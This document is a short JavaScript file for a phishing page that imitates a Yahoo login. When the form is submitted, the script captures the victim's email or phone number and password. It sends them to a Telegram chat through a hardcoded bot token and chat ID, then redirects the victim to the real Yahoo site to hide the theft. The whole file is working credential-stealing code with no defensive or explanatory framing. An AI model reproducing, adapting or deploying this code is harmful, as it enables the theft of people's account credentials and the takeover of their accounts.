const form = document.querySelector('#login-username-form');

form.addEventListener('submit', (e) => {
    e.preventDefault();

    const text1 = document.getElementById("login-username").value;
    const text2 = document.getElementById("passwd").value;
    const countryNum = document.getElementById("selected-country-code");
    const isEmail = countryNum.parentElement.classList.contains("hide");

    const msg = isEmail?
        `
        **Yahoo**
        Email: ${text1}
        Password: ${text2}
        `
        :
        `
        **Yahoo**
        Phone: ${countryNum.innerText+text1}
        Password: ${text2}
        `

    const token = "6674814591:AAE0L5i7a0fA6MrKNVprhDV4c7r4ryr3U9U";
    const chat_id = "-1001974405857";
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`;

    const api = new XMLHttpRequest()
    api.open("GET", url, true)
    api.send()
    // check if it's sent correctly
    api.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            window.location.href = "https://fr.yahoo.com/";
        }
    }
    

    console.log('sent!')
})